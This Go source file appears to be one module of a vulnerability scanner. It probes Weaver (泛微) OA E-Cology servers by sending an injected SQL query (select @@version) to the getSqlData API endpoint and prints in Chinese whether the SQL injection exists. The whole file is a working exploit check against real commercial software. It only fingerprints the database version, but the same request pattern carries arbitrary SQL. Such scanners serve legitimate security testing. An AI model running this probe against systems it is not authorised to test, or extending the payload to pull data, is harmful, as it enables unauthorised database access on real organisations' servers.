package ecology_getsqlData_sqljni

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"io/ioutil"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	vulnUrl := url + "/Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version"
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).Get(vulnUrl)
	if err != nil {
		color.Red.Println("[-08] 泛微OA E-Cology getSqlData SQL注入漏洞不存在")
		return
	}

	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		color.Red.Println("[-08] 泛微OA E-Cology getSqlData SQL注入漏洞不存在")
		return
	}
	body := string(bodyBytes)

	if resp.StatusCode == 200 && strings.Contains(body, "message") {
		color.Green.Println("[+08] 泛微OA E-Cology getSqlData SQL注入漏洞存在 -> ", vulnUrl)
	} else {
		color.Red.Println("[-08] 泛微OA E-Cology getSqlData SQL注入漏洞不存在")
	}
}
